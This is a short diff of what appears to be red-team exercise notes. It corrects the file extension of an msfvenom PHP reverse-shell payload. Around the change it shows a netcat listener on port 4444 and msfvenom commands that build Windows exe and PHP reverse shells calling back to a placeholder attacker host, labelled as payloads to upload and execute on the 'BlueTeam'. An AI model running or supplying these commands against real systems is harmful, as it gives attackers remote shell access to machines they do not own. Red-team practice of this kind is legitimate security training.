@@ -16,7 +16,7 @@ nc -lvnp 4444
 
 #Create shells to upload and execute on BlueTeam
 msfvenom lhost=x.x.x.x lport=4444 -f exe --platform windows -p windows/shell_reverse_tcp > dev.exe
-msfvenom lhost=x.x.x.x lport=4444 -f php --platform windows -p php/windows/shell_reverse_tcp > dev.exe
+msfvenom lhost=x.x.x.x lport=4444 -f php --platform windows -p php/windows/shell_reverse_tcp > dev.php
 
 msfvenom -l 
 
